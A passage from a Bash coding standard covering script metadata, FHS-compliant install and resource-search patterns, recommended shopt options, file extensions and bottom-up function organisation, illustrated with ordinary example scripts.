die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Show version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Show help with script name
show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process data

Process data according to configuration.

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -h, --help     Show this help message
  -V, --version  Show version information

Examples:
  $SCRIPT_NAME -V
HELP
}

# Load configuration from script directory
load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading configuration from ${CONFIG_FILE@Q}"
    source "$CONFIG_FILE"
  else
    die 2 "Configuration file not found ${CONFIG_FILE@Q}"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  info "Running from: ${SCRIPT_PATH@Q}"

  load_config

  # Main logic here
  info 'Processing complete'
}

main "$@"

#fin
```

**Testing metadata:**

```bash
# Test that metadata is set correctly
test_metadata() {
  # VERSION should be set
  [[ -n "$VERSION" ]] || die 1 'VERSION not set'

  # SCRIPT_PATH should be absolute
  [[ "$SCRIPT_PATH" == /* ]] || die 1 'SCRIPT_PATH is not absolute'

  # SCRIPT_PATH should exist
  [[ -f "$SCRIPT_PATH" ]] || die 1 'SCRIPT_PATH does not exist'

  # SCRIPT_DIR should be a directory
  [[ -d "$SCRIPT_DIR" ]] || die 1 'SCRIPT_DIR is not a directory'

  # SCRIPT_NAME should not contain /
  [[ "$SCRIPT_NAME" != */* ]] || die 1 'SCRIPT_NAME contains /'

  # All should be readonly
  readonly -p | grep -q 'VERSION' || die 1 'VERSION not readonly'
  readonly -p | grep -q 'SCRIPT_PATH' || die 1 'SCRIPT_PATH not readonly'

  success 'Metadata validation passed'
}
```

**Summary:**

- **Always declare metadata** immediately after `shopt` settings
- **Use standard names**: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- **Use realpath** to resolve SCRIPT_PATH reliably (canonical BCS approach)
- **Derive SCRIPT_DIR and SCRIPT_NAME** from SCRIPT_PATH using parameter expansion
- **Make readonly as a group** after all assignments
- **Use metadata** for resource location, logging, error messages, version display
- **Handle edge cases**: root directory, sourced scripts
- **Performance**: Consider loading realpath as builtin for maximum speed

**Key principle:** Metadata provides the foundation for reliable script operation. Declaring it consistently at the top of every script enables predictable behavior regardless of how the script is invoked or where it's located.


---


**Rule: BCS0104**

## Filesystem Hierarchy Standard (FHS) Preference

**When designing scripts that install files or search for resources, follow the Filesystem Hierarchy Standard (FHS) where practical. FHS compliance enables predictable file locations, supports both system and user installations, and integrates smoothly with package managers.**

**Rationale:**

- **Predictability**: Users and package managers expect files in standard locations (`/usr/local/bin/`, `/usr/share/`, etc.)
- **Multi-Environment Support**: Scripts work correctly in development, local install, system install, and user-specific install scenarios
- **Package Manager Compatibility**: FHS-compliant layouts work seamlessly with apt, yum, pacman, etc.
- **No Hardcoded Paths**: Using FHS search patterns eliminates brittle absolute paths
- **Portability**: Scripts work across different Linux distributions without modification
- **Separation of Concerns**: FHS separates executables, data, configuration, and documentation logically

**Common FHS locations:**
- `/usr/local/bin/` - User-installed executables (system-wide, not managed by package manager)
- `/usr/local/share/` - Architecture-independent data files
- `/usr/local/lib/` - Libraries and loadable modules
- `/usr/local/etc/` - Configuration files
- `/usr/bin/` - System executables (managed by package manager)
- `/usr/share/` - System-wide architecture-independent data
- `$HOME/.local/bin/` - User-specific executables (in user's PATH)
- `$HOME/.local/share/` - User-specific data files
- `${XDG_CONFIG_HOME:-$HOME/.config}/` - User-specific configuration

**When FHS is useful:**
- Installation scripts that need to place files in standard locations
- Scripts that search for data files in multiple standard locations
- Scripts that support both system-wide and user-specific installation
- Projects distributed to multiple systems expecting standard paths

**Example pattern - searching for data files:**
```bash
find_data_file() {
  local -- script_dir=$1
  local -- filename=$2
  local -a search_paths=(
    "$script_dir"/"$filename"  # Same directory (development)
    /usr/local/share/myapp/"$filename" # Local install
    /usr/share/myapp/"$filename" # System install
    "${XDG_DATA_HOME:-"$HOME"/.local/share}"/myapp/"$filename"  # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; } ||:
  done

  return 1
}
```

**Complete installation example (Makefile pattern):**

```bash
#!/bin/bash
# install.sh - FHS-compliant installation script
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Installation paths (customizable via PREFIX)
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- BIN_DIR="$PREFIX"/bin
declare -- SHARE_DIR="$PREFIX"/share/myapp
declare -- LIB_DIR="$PREFIX"/lib/myapp
declare -- ETC_DIR="$PREFIX"/etc/myapp
declare -- MAN_DIR="$PREFIX"/share/man/man1
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR MAN_DIR

install_files() {
  # Create directories
  install -d "$BIN_DIR"
  install -d "$SHARE_DIR"
  install -d "$LIB_DIR"
  install -d "$ETC_DIR"
  install -d "$MAN_DIR"

  # Install executable
  install -m 755 "$SCRIPT_DIR"/myapp "$BIN_DIR"/myapp

  # Install data files
  install -m 644 "$SCRIPT_DIR"/data/template.txt "$SHARE_DIR"/template.txt

  # Install libraries
  install -m 644 "$SCRIPT_DIR"/lib/common.sh "$LIB_DIR"/common.sh

  # Install configuration (preserve existing)
  if [[ ! -f "$ETC_DIR"/myapp.conf ]]; then
    install -m 644 "$SCRIPT_DIR"/myapp.conf.example "$ETC_DIR"/myapp.conf
  fi

  # Install man page
  install -m 644 "$SCRIPT_DIR"/docs/myapp.1 "$MAN_DIR"/myapp.1

  info "Installation complete to $PREFIX"
  info "Executable: $BIN_DIR/myapp"
}

uninstall_files() {
  # Remove installed files
  rm -f "$BIN_DIR"/myapp
  rm -f "$SHARE_DIR"/template.txt
  rm -f "$LIB_DIR"/common.sh
  rm -f "$MAN_DIR"/myapp.1

  # Remove directories if empty
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR"
  rmdir --ignore-fail-on-non-empty "$LIB_DIR"
  rmdir --ignore-fail-on-non-empty "$ETC_DIR"

  info 'Uninstallation complete'
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}

main "$@"

#fin
```

**FHS-aware resource loading pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Find data file using FHS search pattern
find_data_file() {
  local -- filename=$1
  local -a search_paths=(
    # Development: same directory as script
    "$SCRIPT_DIR"/"$filename"

    # Local install: /usr/local/share
    /usr/local/share/myapp/"$filename"

    # System install: /usr/share
    /usr/share/myapp/"$filename"

    # User install: XDG Base Directory
    "${XDG_DATA_HOME:-"$HOME"/.local/share}"/myapp/"$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path" ]]; then
      echo "$path"
      return 0
    fi
  done

  die 2 "Data file not found ${filename@Q}"
}

# Find configuration file with XDG support
find_config_file() {
  local -- filename=$1
  local -a search_paths=(
    # User-specific config (highest priority)
    "${XDG_CONFIG_HOME:-"$HOME"/.config}"/myapp/"$filename"

    # System-wide local config
    /usr/local/etc/myapp/"$filename"

    # System-wide config
    /etc/myapp/"$filename"

    # Development/fallback
    "$SCRIPT_DIR"/"$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ ! -f "$path" ]] || { echo "$path"; return 0; }
  done

  # Return empty if not found (config is optional)
  return 1
}

# Load library from FHS locations
load_library() {
  local -- lib_name=$1
  local -a search_paths=(
    # Development
    "$SCRIPT_DIR"/lib/"$lib_name"

    # Local install
    /usr/local/lib/myapp/"$lib_name"

    # System install
    /usr/lib/myapp/"$lib_name"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { source "$path"; return 0; } ||:
  done

  die 2 "Library not found ${lib_name@Q}"
}

main() {
  # Load required library
  load_library common.sh

  # Find data file
  local -- template
  template=$(find_data_file template.txt)
  info "Using template ${template@Q}"

  # Find config file (optional)
  local -- config
  if config=$(find_config_file myapp.conf); then
    info "Loading config ${config@Q}"
    source "$config"
  else
    info 'No config file found, using defaults'
  fi

  # Main logic here
  #...
}

main "$@"
#fin
```

**PREFIX customization (make install pattern):**

```bash
# Makefile example
PREFIX ?= /usr/local
BINDIR = $(PREFIX)/bin
SHAREDIR = $(PREFIX)/share/myapp
MANDIR = $(PREFIX)/share/man/man1

install:
	install -d $(BINDIR)
	install -d $(SHAREDIR)
	install -d $(MANDIR)
	install -m 755 myapp $(BINDIR)/myapp
	install -m 644 data/template.txt $(SHAREDIR)/template.txt
	install -m 644 docs/myapp.1 $(MANDIR)/myapp.1

uninstall:
	rm -f $(BINDIR)/myapp
	rm -f $(SHAREDIR)/template.txt
	rm -f $(MANDIR)/myapp.1

# Usage:
# make install                      # Installs to /usr/local
# make PREFIX=/usr install          # Installs to /usr
# make PREFIX=$HOME/.local install  # User install
```

**XDG Base Directory Specification:**

For user-specific files, follow XDG Base Directory spec:

```bash
# XDG environment variables with fallbacks
declare -- XDG_DATA_HOME=${XDG_DATA_HOME:-"$HOME"/.local/share}
declare -- XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-"$HOME"/.config}
declare -- XDG_CACHE_HOME=${XDG_CACHE_HOME:-"$HOME"/.cache}
declare -- XDG_STATE_HOME=${XDG_STATE_HOME:-"$HOME"/.local/state}

# User-specific paths
declare -- USER_DATA_DIR="$XDG_DATA_HOME"/myapp
declare -- USER_CONFIG_DIR="$XDG_CONFIG_HOME"/myapp
declare -- USER_CACHE_DIR="$XDG_CACHE_HOME"/myapp
declare -- USER_STATE_DIR="$XDG_STATE_HOME"/myapp

# Create user directories if needed
install -d "$USER_DATA_DIR"
install -d "$USER_CONFIG_DIR"
install -d "$USER_CACHE_DIR"
install -d "$USER_STATE_DIR"
```

**Production-Ready Templates (Copy-Paste Ready):**

These templates are extracted from the `bcs` script itself and demonstrate production-tested FHS compliance patterns. Adapt by replacing `yatti/bash-coding-standard` with your organization/project name.

**Template 1: Find File in FHS Locations**

This template searches for a specific file across all standard FHS locations, supporting development mode, custom PREFIX installs, system-local, and system-wide installations.

```bash
# Find specific file (e.g., BASH-CODING-STANDARD.md, config.yml, data.json)
# Usage: bcs_file=$(find_bcs_file "$SCRIPT_DIR") || die 'File not found'
find_bcs_file() {
  local -- script_dir=$1
  local -- install_share="${script_dir%/bin}"/share/yatti/bash-coding-standard
  local -a search_paths=(
    "$script_dir"                                 # Development: same directory
    "$install_share"                              # Custom PREFIX: relative to bin/
    /usr/local/share/yatti/bash-coding-standard   # System-local install
    /usr/share/yatti/bash-coding-standard         # System-wide install
  )
  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path"/BASH-CODING-STANDARD.md ]]; then
      echo "$path"/BASH-CODING-STANDARD.md
      return 0
    fi
  done

  return 1
}
declare -fx find_bcs_file

# Usage example:
BCS_FILE=$(find_bcs_file "$SCRIPT_DIR") || die 1 'BASH-CODING-STANDARD.md not found'
```

**Key features of this template:**
- **`install_share` calculation**: Dynamically computes share directory from bin directory using `${script_dir%/bin}/share/...`
- **Four search locations**: Development, custom PREFIX, /usr/local, /usr
- **Early return on found**: Uses `&& { echo ...; return 0; }` for immediate success
- **Export**: Uses `declare -fx` for use in subshells if needed

**Adaptation guide:**
```bash
# Replace 'yatti/bash-coding-standard' with your org/project:
install_share="${script_dir%/bin}"/share/myorg/myproject
/usr/local/share/myorg/myproject
/usr/share/myorg/myproject

# Replace 'BASH-CODING-STANDARD.md' with your target file:
[[ -f "$path"/config.yml ]] && { echo "$path"/config.yml; return 0; }

# Rename function to match purpose:
find_config_file() { ... }
find_template_file() { ... }
```

**Template 2: Find Data Directory**

This template finds the data directory itself (rather than a specific file), useful for scripts that need to enumerate or access multiple files within the data directory.

```bash
# Find data directory in FHS locations
# Usage: data_dir=$(find_data_dir) || die 'Data directory not found'
find_data_dir() {
  local -- install_share="${BCS_DIR%/bin}/share/yatti/bash-coding-standard/data"
  local -a search_paths=(
    "$BCS_DIR"/data                                   # Development mode
    "$install_share"                                  # Custom PREFIX install
    /usr/local/share/yatti/bash-coding-standard/data  # System-local install
    /usr/share/yatti/bash-coding-standard/data        # System-wide install
  )
  local -- path
  for path in "${search_paths[@]}"; do
    [[ -d "$path" ]] && { echo "$path"; return 0; } ||:
  done

  return 1
}
declare -fx find_data_dir

# Usage example:
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
```

**Differences from Template 1:**
- **Directory check**: Uses `[[ -d "$path" ]]` instead of `[[ -f ... ]]`
- **Returns directory**: Echoes directory path, not file path
- **Enables enumeration**: Caller can then use `find "$DATA_DIR" ...` or `for file in "$DATA_DIR"/*.md`

**Usage patterns:**
```bash
# Pattern 1: Find and enumerate files
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
readarray -t md_files < <(find "$DATA_DIR" -name '*.md' | sort)

# Pattern 2: Check for specific files in data directory
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
[[ -f "$DATA_DIR"/templates/basic.sh ]] || die 1 'Template not found'

# Pattern 3: Iterate over data files
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
for file in "$DATA_DIR"/*.json; do
  process_json "$file"
done
```

**Combined Template: Universal FHS Resource Finder**

For maximum flexibility, combine both patterns into a generic resource finder:

```bash
# Generic FHS resource finder
# Usage: find_resource file "config.yml" || die 'Config not found'
# Usage: find_resource dir "data" || die 'Data directory not found'
find_resource() {
  local -- type=$1     # 'file' or 'dir'
  local -- name=$2     # Resource name
  local -- install_base="${SCRIPT_DIR%/bin}"/share/myorg/myproject
  local -a search_paths=(
    "$SCRIPT_DIR"                        # Development
    "$install_base"                      # Custom PREFIX
    /usr/local/share/myorg/myproject     # Local install
    /usr/share/myorg/myproject           # System install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    local -- resource="$path/$name"
    case "$type" in
      file) [[ -f "$resource" ]] && { echo "$resource"; return 0; } ||: ;;
      dir)  [[ -d "$resource" ]] && { echo "$resource"; return 0; } ||: ;;
      *)    die 2 "Invalid resource type ${type@Q}" ;;
    esac
  done

  return 1
}
declare -fx find_resource

# Usage:
CONFIG=$(find_resource file config.yml) || die 'Config not found'
DATA_DIR=$(find_resource dir data) || die 'Data directory not found'
TEMPLATE=$(find_resource file templates/basic.sh) || die 'Template not found'
```

**Real-world example from this repository:**

The actual `bash-coding-standard` (bcs) script uses these exact patterns (lines 137-171 in bcs). Here's the simplified version showing the file search:

```bash
find_bcs_file() {
  local -a search_paths=(
    # Development: same directory as script
    "$SCRIPT_DIR"/BASH-CODING-STANDARD.md

    # Local install: /usr/local/share
    /usr/local/share/yatti/bash-coding-standard/BASH-CODING-STANDARD.md

    # System install: /usr/share
    /usr/share/yatti/bash-coding-standard/BASH-CODING-STANDARD.md
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; } ||:
  done

  die 2 'BASH-CODING-STANDARD.md not found in any standard location'
}

BCS_FILE=$(find_bcs_file)
```

This approach allows the script to work in:
- Development mode (running from source directory)
- After `make install` (to /usr/local)
- After `make PREFIX=/usr install` (system-wide)
- When installed by package manager (debian, rpm, etc.)

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - hardcoded absolute path
data_file=/home/user/projects/myapp/data/template.txt

# ✓ Correct - FHS search pattern
data_file=$(find_data_file template.txt)

# ✗ Wrong - assuming specific install location
source /usr/local/lib/myapp/common.sh

# ✓ Correct - search multiple FHS locations
load_library common.sh

# ✗ Wrong - using relative paths from CWD
source ../lib/common.sh  # Breaks when run from different directory

# ✓ Correct - paths relative to script location
source "$SCRIPT_DIR"/../lib/common.sh

# ✗ Wrong - installing to non-standard location
install myapp /opt/random/location/bin/

# ✓ Correct - use PREFIX-based FHS paths
install myapp "$PREFIX"/bin/

# ✗ Wrong - not supporting PREFIX customization
BIN_DIR=/usr/local/bin  # Hardcoded

# ✓ Correct - respect PREFIX environment variable
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin

# ✗ Wrong - mixing executables and data in same directory
install myapp /opt/myapp/
install template.txt /opt/myapp/

# ✓ Correct - separate by FHS hierarchy
install myapp "$PREFIX"/bin/
install template.txt "$PREFIX"/share/myapp/

# ✗ Wrong - overwriting user configuration on upgrade
install myapp.conf "$PREFIX"/etc/myapp/myapp.conf

# ✓ Correct - preserve existing config
[[ -f "$PREFIX"/etc/myapp/myapp.conf ]] || \
  install myapp.conf.example "$PREFIX"/etc/myapp/myapp.conf
```

**Edge cases:**

**1. PREFIX with trailing slash:**

```bash
# Handle PREFIX with or without trailing slash
PREFIX=${PREFIX:-/usr/local}
PREFIX=${PREFIX%/}  # Remove trailing slash if present
BIN_DIR="$PREFIX"/bin
```

**2. User install without sudo:**

```bash
# Detect if user has write permissions
if [[ ! -w "$PREFIX" ]]; then
  warn "No write permission to ${PREFIX@Q}"
  info "Try: PREFIX=\$HOME/.local make install"
  die 5 'Permission denied'
fi
```

**3. Library path for runtime:**

```bash
# Some systems need LD_LIBRARY_PATH for custom locations
if [[ -d "$PREFIX"/lib/myapp ]]; then
  export LD_LIBRARY_PATH="$PREFIX"/lib/myapp"${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
fi
```

**4. Symlink vs real path:**

```bash
# If script is symlinked to /usr/local/bin, SCRIPT_DIR resolves to actual location
# This is correct - we want the real installation directory, not the symlink location
SCRIPT_PATH=$(realpath -- "$0")  # Resolves symlinks
SCRIPT_DIR=${SCRIPT_PATH%/*}

# Now SCRIPT_DIR points to actual install location, not /usr/local/bin
```

**When NOT to use FHS:**

- **Single-user scripts**: Scripts only used by one user don't need FHS
- **Project-specific tools**: Build scripts, test runners that stay in project directory
- **Container applications**: Docker containers often use app-specific paths like `/app`
- **Embedded systems**: Limited systems may use custom layouts

**Summary:**

- **Follow FHS** for scripts that install system-wide or distribute to users
- **Use PREFIX** to support custom installation locations
- **Search multiple locations** for resources (development, local, system, user)
- **Separate file types**: bin/ for executables, share/ for data, etc/ for config, lib/ for libraries
- **Support XDG** for user-specific files (`XDG_CONFIG_HOME`, `XDG_DATA_HOME`)
- **Preserve user config** on upgrades (don't overwrite existing files)
- **Make PREFIX customizable** via environment variable

**Key principle:** FHS compliance makes scripts portable, predictable, and compatible with package managers. Design scripts to work in development mode and multiple install scenarios without modification.


---


**Rule: BCS0105**

## shopt

**Recommended settings for most scripts:**

```bash
# RECOMMENDED - apply to all scripts
shopt -s inherit_errexit  # Critical: makes set -e work in subshells,
                          # command substitutions
shopt -s shift_verbose    # Catches shift errors when no arguments remain
shopt -s extglob          # Enables extended glob patterns like !(*.txt)

# CHOOSE ONE based on use case:
shopt -s nullglob   # For arrays/loops: unmatched globs → empty (no error)
                # OR
shopt -s failglob   # For strict scripts: unmatched globs → error

# OPTIONAL based on needs:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Detailed rationale for each setting:**

**`inherit_errexit` (CRITICAL):**
- **Without it**: `set -e` does NOT apply inside command substitutions or subshells
- **With it**: Errors in `$(...)` and `(...)` properly propagate
- **Example of the problem:**
```bash
set -e  # Without inherit_errexit
result=$(false)  # This does NOT exit the script!
echo "Still running"  # This executes

# With inherit_errexit
shopt -s inherit_errexit
result=$(false)  # Script exits here as expected
```

**`shift_verbose`:**
- **Without it**: `shift` silently fails when no arguments remain, continues execution
- **With it**: Prints error message when shift fails (respects `set -e`)
- **Example:**
```bash
shopt -s shift_verbose
shift  # If no arguments: "bash: shift: shift count must be <= $#"
```

**`extglob`:**
- **Enables advanced pattern matching** that regular globs cannot do
- **Patterns enabled**: `?(pattern)`, `*(pattern)`, `+(pattern)`, `@(pattern)`, `!(pattern)`
- **Example use cases:**
```bash
shopt -s extglob

# Delete everything EXCEPT .txt files
rm !(*.txt)

# Match files with multiple extensions
cp *.@(jpg|png|gif) /destination/

# Match one or more digits
[[ $input == +([0-9]) ]] && echo 'Number'
```

**`nullglob` vs `failglob` (Choose one):**

**`nullglob`:**
- **Best for**: Scripts that process file lists in loops/arrays
- **Behavior**: Unmatched glob expands to empty string (no error)
- **Example:**
```bash
shopt -s nullglob
for file in *.txt; do  # If no .txt files, loop body never executes
  echo "$file"
done

files=(*.log)  # If no .log files: files=() (empty array)
```

**`failglob`:**
- **Best for**: Strict scripts where unmatched glob indicates an error
- **Behavior**: Unmatched glob causes error (respects `set -e`)
- **Example:**
```bash
shopt -s failglob
cat *.conf  # If no .conf files: "bash: no match: *.conf" (exits with set -e)
```

**Without either (default bash behavior):**
```bash
# ✗ Dangerous default behavior
for file in *.txt; do  # If no .txt files, $file = literal string "*.txt"
  rm "$file"  # Tries to delete file named "*.txt"!
done
```

**`globstar` (OPTIONAL):**
- **Enables `**` for recursive directory matching** (like `find`)
- **Warning**: Can be slow on deep directory trees
- **Example:**
```bash
shopt -s globstar

# Recursively find all .sh files
for script in **/*.sh; do
  shellcheck "$script"
done

# Equivalent to: find . -name '*.sh' -type f
```

**Typical script configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use these settings:**
- **Interactive scripts**: May want more lenient behavior
- **Legacy compatibility**: Older bash versions may not support all options
- **Performance-critical loops**: `globstar` can be slow on large trees


---


**Rule: BCS0106**

## File Extensions
- Executables should have `.sh` extension or no extension
- Libraries must have `.sh` extension and should not be executable
- Libraries that can also be executed as scripts can have either `.sh` or no extension
- If the executable will be available globally via PATH, always use no extension


---


**Rule: BCS0107**

## Function Organization

**Always organize functions bottom-up: lowest-level primitives first (messaging, utilities), then composition layers, ending with `main()` as the highest-level orchestrator. This pattern makes scripts readable, maintainable, and eliminates forward reference issues.**

**Rationale:**

- **No Forward References**: Bash reads top-to-bottom; defining functions in dependency order ensures all called functions exist before use
- **Readability**: Readers understand primitives first, then see how they're composed into complex operations
- **Debugging Efficiency**: When debugging, you can read from top down and understand dependencies immediately
- **Maintainability**: Clear dependency hierarchy makes it obvious where to add new functions
- **Testability**: Low-level functions can be tested independently before testing higher-level compositions
- **Cognitive Load**: Understanding small pieces first, then compositions reduces mental overhead

**Standard 7-layer organization pattern:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging functions (lowest level - used by everything)
_msg() { ... }
success() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# 2. Documentation functions (no dependencies)
show_help() { ... }

# 3. Helper/utility functions (used by validation and business logic)
yn() { ... }
noarg() { ... }

# 4. Validation functions (check prerequisites, dependencies)
check_root() { ... }
check_prerequisites() { ... }
check_builtin_support() { ... }

# 5. Business logic functions (domain-specific operations)
build_standalone() { ... }
build_builtin() { ... }
install_standalone() { ... }
install_builtin() { ... }
install_completions() { ... }
update_man_database() { ... }

# 6. Orchestration/flow functions
show_completion_message() { ... }
uninstall_files() { ... }

# 7. Main function (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites

  if ((UNINSTALL)); then
    uninstall_files
    return 0
  fi

  build_standalone
  ((INSTALL_BUILTIN)) && build_builtin

  install_standalone
  install_completions
  ((INSTALL_BUILTIN)) && install_builtin

  update_man_database
  show_completion_message
}

main "$@"
#fin
```

**Key principle of bottom-up organization:**

Each function can safely call functions defined ABOVE it (earlier in the file). Dependencies flow downward: higher functions call lower functions, never upward.

```
Top of file
     ↓
[Layer 1: Messaging] ← Can call nothing (primitives)
     ↓
[Layer 2: Documentation] ← Can call Layer 1
     ↓
[Layer 3: Utilities] ← Can call Layers 1-2
     ↓
[Layer 4: Validation] ← Can call Layers 1-3
     ↓
[Layer 5: Business Logic] ← Can call Layers 1-4
     ↓
[Layer 6: Orchestration] ← Can call Layers 1-5
     ↓
[Layer 7: main()] ← Can call all layers
     ↓
main "$@" invocation
#fin
```

**Detailed layer descriptions:**

**Layer 1: Messaging functions (lowest primitives)**
- `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()`, `debug()`, `vecho()`
- **Purpose**: Output messages to user
- **Dependencies**: None (pure I/O)
- **Used by**: Everything

**Layer 2: Documentation functions**
- `show_help()`, `show_version()`, `show_help()`
- **Purpose**: Display help text and usage information
- **Dependencies**: May use messaging functions
- **Used by**: Argument parsing, main()

**Layer 3: Helper/utility functions**
- `yn()`, `noarg()`, `trim()`, `s()`, `decp()`
- **Purpose**: Generic utilities usable anywhere
- **Dependencies**: May use messaging
- **Used by**: Validation, business logic

**Layer 4: Validation functions**
- `check_root()`, `check_prerequisites()`, `validate_input()`, `check_dependencies()`
- **Purpose**: Verify preconditions and input
- **Dependencies**: Utilities, messaging
- **Used by**: main(), business logic

**Layer 5: Business logic functions**
- Domain-specific operations: `build_project()`, `process_file()`, `deploy_app()`
- **Purpose**: Core functionality of the script
- **Dependencies**: All lower layers
- **Used by**: Orchestration, main()

**Layer 6: Orchestration functions**
- `run_build_phase()`, `run_deploy_phase()`, `cleanup()`
- **Purpose**: Coordinate multiple business logic functions
- **Dependencies**: Business logic, validation
- **Used by**: main()

**Layer 7: main() function**
- **Purpose**: Top-level script flow
- **Dependencies**: Can call any function
- **Used by**: Script invocation line

**Complete example showing full organization:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global variables
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- BUILD_DIR=/tmp/build

# ============================================================================
# Layer 1: Messaging functions
# ============================================================================
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Layer 2: Documentation functions
# ============================================================================

show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

show_help() {
  cat << EOF
$SCRIPT_NAME $VERSION - Build/Deploy application

Build and deploy the application for all users on $HOSTNAME.

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -n, --dry-run   Dry-run mode (no changes)
  -v, --verbose   Enable verbose output
  -q, --quiet     Disable verbose output
  -V, --version   Show version
  -h, --help      Show this help

Examples:
  $SCRIPT_NAME -vn
  $SCRIPT_NAME -V
EOF
}

# ============================================================================
# Layer 3: Helper/utility functions
# ============================================================================

yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

noarg() { (($# < 2)) && die 2 "Option ${1@Q} requires an argument"; }

# ============================================================================
# Layer 4: Validation functions
# ============================================================================

check_prerequisites() {
  info 'Checking prerequisites...'

  # Check required commands
  local -- cmd
  for cmd in git make tar; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  # Check build directory writable
  if [[ ! -w "${BUILD_DIR%/*}" ]]; then
    die 5 "Cannot write to build directory ${BUILD_DIR@Q}"
  fi

  success 'Prerequisites check passed'
}

validate_config() {
  info 'Validating configuration...'

  # Check config file exists
  [[ -f 'config.conf' ]] || die 2 'Configuration file not found: config.conf'

  # Validate config contents
  source 'config.conf'

  [[ -n "${APP_NAME:-}" ]] || die 22 'APP_NAME not set in config'
  [[ -n "${APP_VERSION:-}" ]] || die 22 'APP_VERSION not set in config'

  debug "App: $APP_NAME $APP_VERSION"
  success 'Configuration validated'
}

# ============================================================================
# Layer 5: Business logic functions
# ============================================================================

clean_build_dir() {
  info "Cleaning build directory ${BUILD_DIR@Q}"

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would remove build directory'
    return 0
  fi

  if [[ -d "$BUILD_DIR" ]]; then
    rm -rf "$BUILD_DIR"
    debug "Removed: $BUILD_DIR"
  fi

  install -d "$BUILD_DIR"
  success "Build directory ready: $BUILD_DIR"
}

compile_sources() {
  info 'Compiling sources...'

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would compile sources'
    return 0
  fi

  # Compile logic here
  make -C src all BUILD_DIR="$BUILD_DIR"

  success 'Sources compiled'
}

run_tests() {
  info 'Running tests...'

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would run tests'
    return 0
  fi

  # Test logic here
  make -C tests all

  success 'Tests passed'
}

create_package() {
  info 'Creating package...'
